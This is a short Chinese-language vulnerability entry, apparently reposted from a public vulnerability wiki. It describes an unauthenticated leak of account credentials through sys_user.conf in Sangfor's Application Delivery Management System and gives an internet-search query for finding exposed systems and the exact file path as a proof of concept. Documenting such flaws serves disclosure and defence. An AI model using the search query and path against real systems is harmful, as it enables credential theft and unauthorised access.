---
title: "深信服 应用交付管理系统 sys_user.conf 账号密码泄漏漏洞"
date: 2026-10-16 09:11:06
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "深信服"
tags:
  - "深信服"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

深信服 应用交付管理系统 文件sys_user.conf可在未授权的情况下直接访问，导致账号密码泄漏

## 漏洞影响

```
深信服 应用交付管理系统
```

## 网络测绘

```
app="SANGFOR-应用交付管理系统"
```

## 漏洞复现

登录页面

![image-20220525145113865](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251451936.png)

验证POC

```
/tmp/updateme/sinfor/ad/sys/sys_user.conf
```

![image-20220525145136819](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251451862.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D-%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-sys_user.conf-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
